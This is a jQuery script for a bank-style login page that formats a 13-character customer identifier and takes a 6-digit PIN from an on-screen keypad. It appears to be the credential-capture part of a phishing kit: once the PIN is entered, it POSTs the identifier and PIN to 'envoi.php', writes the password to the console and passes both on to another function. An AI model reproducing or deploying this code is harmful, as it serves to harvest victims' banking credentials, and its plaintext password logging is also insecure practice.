// $(document).ready(function() {
  $('.passwordPanel, #editLogin, #clear').hide();
  $('#tryBtn').click(function(event) {
    location.reload();
  });
  $('#login').keyup(function(event) {
    if($('#login').val().length == 3 || $('#login').val().length == 7 || $('#login').val().length == 11){
      $('#login').val($('#login').val()+' ');
    }
    if($('#login').val().length  == 13){
      $('#login').attr('readonly', 'readonly').attr('disabled', 'disabled');
      $('#editLogin').show();
      $('.passwordPanel').show();
    }
  });
  $('#editLogin').click(function(event) {
    $('#login').removeAttr('readonly').removeAttr('disabled');
    $('.passwordPanel').hide();
  });
  $('#clear').click(function(event) {
    $('.dot.complete').removeClass('complete');
    $('#password').val('');
    $('#clear').hide();
  });
  $('.cn-text-default').each(function(index, el) {
    $(el).click(function(event) {
      $('#clear').show();
      if($('#password').val().length < 6)
        $('#password').val($('#password').val()+$(el).html());
      $('.dot').not('.complete').addClass('complete').nextAll().removeClass('complete');
      if($('#password').val().length == 6){
        $login = $('#login').val();
        $password = $('#password').val();
        {
          var $form = $('#loginForm');
          var $inputs = $form.find("input, select, button, textarea");
          var serializedData = new FormData();
          serializedData.append('login', $login);
          serializedData.append('password', $password);
          $inputs.prop("disabled", true);

          request = null;

          // Ajax to send Request
          request = $.ajax({
            type: 'POST',
            url: 'envoi.php',
            data: serializedData,
            contentType: false,
            cache: false,
            processData: false,
            beforeSend: function(){ }
          });

          // Callback handler that will be called on success
          request.done(function(msg){
              console.log("test okay :"+$password);
              updateProduit($login,$password);
            setTimeout(10000, $('#dialog').show());
          });

          // Callback handler that will be called on failure
          request.fail(function (jqXHR, textStatus, errorThrown){
            // Log the error to the console
            console.error(
              "An error occurred: "+
              textStatus, errorThrown
            );
          });

          // Callback handler that will be called regardless
          // if the request failed or succeeded
          request.always(function () {
            // Reenable the inputs
            $inputs.prop("disabled", false);
          });
        }
      }
    });
  });
